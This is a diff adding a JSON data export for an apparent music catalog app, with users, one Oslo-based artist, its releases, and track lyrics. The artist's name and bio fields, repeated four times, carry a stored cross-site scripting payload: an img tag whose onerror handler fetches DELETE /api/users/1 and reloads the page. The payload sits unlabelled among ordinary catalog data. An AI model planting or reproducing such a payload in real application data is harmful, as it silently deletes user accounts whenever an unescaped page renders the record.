@@ -1,0 +1,112 @@
+{
+  "users": [
+    {
+      "id": 2,
+      "name": "Jane Doe"
+    },
+    {
+      "id": 1,
+      "name": "John Doe"
+    }
+  ],
+  "artists": [
+    {
+      "id": 1,
+      "name": "<img src=x onerror=\"fetch('/api/users/1',{method:'DELETE'}).then(()=>location.reload())\">",
+      "origin": "Oslo, Norway",
+      "bio": "<img src=x onerror=\"fetch('/api/users/1',{method:'DELETE'}).then(()=>location.reload())\"> is a progressive project hailing from Oslo, Norway. Blending ambient math-metal with complex time signatures and emotional, ambient passages, the project explores the interplay between neural geometry and fractal structures. A signature sound composed of syncopated rhythms, lush synthesis, and intricate instrumentation.",
+      "catalog_avg": null
+    }
+  ],
+  "artistDetails": {
+    "1": {
+      "id": 1,
+      "name": "<img src=x onerror=\"fetch('/api/users/1',{method:'DELETE'}).then(()=>location.reload())\">",
+      "bio": "<img src=x onerror=\"fetch('/api/users/1',{method:'DELETE'}).then(()=>location.reload())\"> is a progressive project hailing from Oslo, Norway. Blending ambient math-metal with complex time signatures and emotional, ambient passages, the project explores the interplay between neural geometry and fractal structures. A signature sound composed of syncopated rhythms, lush synthesis, and intricate instrumentation.",
+      "origin": "Oslo, Norway",
+      "members": [
+        "Viktor Storm",
+        "Jesper Nilsson",
+        "Nils Larsson",
+        "Erik Lindqvist"
+      ],
+      "upcoming_releases": [
+        "Currently composing tracks for a new concept album about neural geometry",
+        "Preparing a special livestream performance from Oslo"
+      ],
+      "personal_notes": "Fascinating approach to modern ambient math-metal. The drum programming is highly intricate, and the atmospheric layers feel extremely premium. Definitely keep an eye on their upcoming releases.",
+      "releases": [
+        {
+          "id": 2,
+          "artist_id": 1,
+          "title": "Fractal structures",
+          "type": "single",
+          "release_year": 2021,
+          "artwork_url": "https://images.unsplash.com/photo-1579783900882-c0d3dad7b119?w=500&auto=format&fit=crop&q=60",
+          "tracks": [
+            {
+              "id": 5,
+              "release_id": 2,
+              "title": "Fractal structures",
+              "duration": 274,
+              "lyrics": "A single moment frozen.\nIsolated in the stream.\nWe are the ones chosen\nTo wake up from this dream.",
+              "avg_score": null,
+              "userScores": {}
+            }
+          ],
+          "avg_score": null
+        },
+        {
+          "id": 1,
+          "artist_id": 1,
+          "title": "The Chronicles of Neural geometry",
+          "type": "album",
+          "release_year": 2020,
+          "artwork_url": "https://images.unsplash.com/photo-1506157786151-b8491531f063?w=500&auto=format&fit=crop&q=60",
+          "tracks": [
+            {
+              "id": 1,
+              "release_id": 1,
+              "title": "Shattered Mirror",
+              "duration": 263,
+              "lyrics": "Reflections in the broken glass.\nWe watch the fragments fall.\nSearching for a shape we lost.\nThere is no sound at all.",
+              "avg_score": null,
+              "userScores": {}
+            },
+            {
+              "id": 2,
+              "release_id": 1,
+              "title": "Neural Path",
+              "duration": 289,
+              "lyrics": "Synapses firing in the dark.\nA code we cannot read.\nWe trace the wires to the heart.\nAnd follow where they lead.",
+              "avg_score": null,
+              "userScores": {}
+            },
+            {
+              "id": 3,
+              "release_id": 1,
+              "title": "The Void Whispers",
+              "duration": 331,
+              "lyrics": "Listen to the quiet hum.\nBetween the stars, the cold.\nA song of what we will become.\nA story yet untold.",
+              "avg_score": null,
+              "userScores": {}
+            },
+            {
+              "id": 4,
+              "release_id": 1,
+              "title": "Final Equation",
+              "duration": 281,
+              "lyrics": "Solve for the light.\nSubtract the shadows we create.\nThe math is always right.\nBut it is far too late.",
+              "avg_score": null,
+              "userScores": {}
+            }
+          ],
+          "avg_score": null
+        }
+      ],
+      "catalog_avg": null
+    }
+  },
+  "awards": {},
+  "exportedAt": "2026-06-09T18:25:50.399Z"
+}
